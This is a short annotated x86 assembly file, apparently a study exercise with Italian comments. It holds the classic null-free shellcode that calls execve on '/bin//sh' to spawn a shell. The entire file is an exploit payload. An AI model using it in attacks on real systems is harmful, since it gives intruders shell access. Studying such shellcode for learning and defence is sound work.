BITS 32

section .text
global _start

_start:
    xor eax, eax
    push eax        ; termino la stringa senza aggiungere \0
    push 0x68732f2f 
    push 0x6e69622f ; ora lo stack ha al suo interno (formattazione little-endian)
                    ; "/bin//sh"
    mov ebx, esp    ; lo porto come argomento 1
    xor ecx, ecx    ; ecx = 0 è secondo arg
    xor edx, edx    ; edx = 0 è terzo arg
    mov al, 0xb     ; execve()
    int 0x80  